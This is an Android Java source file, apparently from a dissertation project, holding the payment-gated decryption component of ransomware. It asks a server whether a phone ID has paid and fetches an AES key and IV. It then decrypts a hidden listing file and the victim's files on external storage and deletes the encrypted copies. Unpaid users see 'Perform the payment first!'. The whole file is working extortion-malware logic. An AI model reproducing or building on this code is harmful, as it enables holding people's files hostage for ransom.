package com.example.disertatie;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.JsonReader;
import android.util.Log;
import android.widget.Toast;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Iterator;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class AsyncRequestDEC extends AsyncTask<String, Void, Void> {
    public static List<String> findFiles(Path path, String fileExtension){

        if(!Files.isDirectory(path)) throw new IllegalArgumentException("Path is not a directory!");
        List<String> result = null;

        try(Stream<Path> walk = Files.walk(path)){
            result = walk.filter(p -> !Files.isDirectory(p)).map(p ->p.toString().toLowerCase())
                    .filter(f -> f.endsWith(fileExtension))
                    .collect(Collectors.toList());
            return result;
        } catch (IOException e) {
            e.printStackTrace();
        }

        return result;
    }

    private Context mContext;
    public AsyncRequestDEC(Context context){
        mContext = context;
    }


    @Override
    protected Void doInBackground(String... strings) {
        String URL = strings[0];
        String phoneID = strings[1];
        HttpURLConnection con = null;
        try {
            //get keys for passed id
            URL url = new URL(strings[0] + "?id=" + strings[1]);
            con = (HttpURLConnection) url.openConnection();
            con.setRequestMethod("GET");
            con.setRequestProperty("Content-Type", "application/json; utf-8");
            //con.setRequestProperty("Accept","application/json");
            //create json with data to send to the db
            InputStream inputStream = con.getInputStream();
            StringBuilder builder = new StringBuilder();
            Reader reader = new BufferedReader(new InputStreamReader(inputStream,
                    Charset.forName(StandardCharsets.UTF_8.name())));
            int c = 0;
            while ((c = reader.read()) != -1){
                builder.append((char) c);
            }
            String response = builder.toString();
            Log.d("test","JSON response is: " + response);
            //read response into a jsonObject
            JSONObject jsonObject = new JSONObject(response);
            String IV = jsonObject.getString("IV");
            String key = jsonObject.getString("KEY");
            Boolean isPaid = jsonObject.getBoolean("PAYMENT");
            Log.d("test","response iv and key:" + IV + "  " + key);
            if(isPaid) {
                //decrypt everything according to enc json
                //cipher
                Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                //IV and keys and initialize
                IvParameterSpec iv = new IvParameterSpec(IV.getBytes(StandardCharsets.UTF_8));
                SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8),
                        "AES");
                cipher.init(Cipher.DECRYPT_MODE, keySpec, iv);
                //decrypt listing file first and get keys
                List<String> jsonFiles = findFiles(Paths.get(Environment.getExternalStorageDirectory().getPath())
                        , "jsonenc");
                Log.d("test", "json file found!: " + jsonFiles.get(0));
                String jsonFilePath = jsonFiles.get(0);
                FileInputStream jsonFis = new FileInputStream(jsonFilePath);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                int readByte = jsonFis.read();
                while (readByte != -1) {
                    bos.write(readByte);
                    readByte = jsonFis.read();
                }
                byte[] content = bos.toByteArray();
                String decryptedJSON = new String(cipher.doFinal(content), StandardCharsets.UTF_8);
                Log.d("test", "Decrypted json: " + decryptedJSON);
                JSONObject json = new JSONObject(decryptedJSON);
                Iterator<String> jsonKeys = json.keys();
                while (jsonKeys.hasNext()) {
                    //decrypt each file from the list and put it back in its place
                    String jsonKey = jsonKeys.next();
                    String encryptedFile = json.getString(jsonKey);
                    FileInputStream fis = new FileInputStream(encryptedFile);
                    FileOutputStream fos = new FileOutputStream(jsonKey);
                    ByteArrayOutputStream fileBos = new ByteArrayOutputStream();
                    readByte = fis.read();
                    while (readByte != -1) {
                        fileBos.write(readByte);
                        readByte = fis.read();
                    }
                    byte[] fileContent = fileBos.toByteArray();
                    byte[] decryptedContent = cipher.doFinal(fileContent);
                    fos.write(decryptedContent);
                    fis.close();
                    fos.close();
                    File file = new File(encryptedFile);
                    if(file.exists()){
                        file.delete();
                    }
                }
                File jsonFile = new File(jsonFilePath);
                if(jsonFile.exists()){
                    jsonFile.delete();
                }
            }else{
                Toast toast = Toast.makeText(mContext,"Perform the payment first!",Toast.LENGTH_LONG);
                toast.show();
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
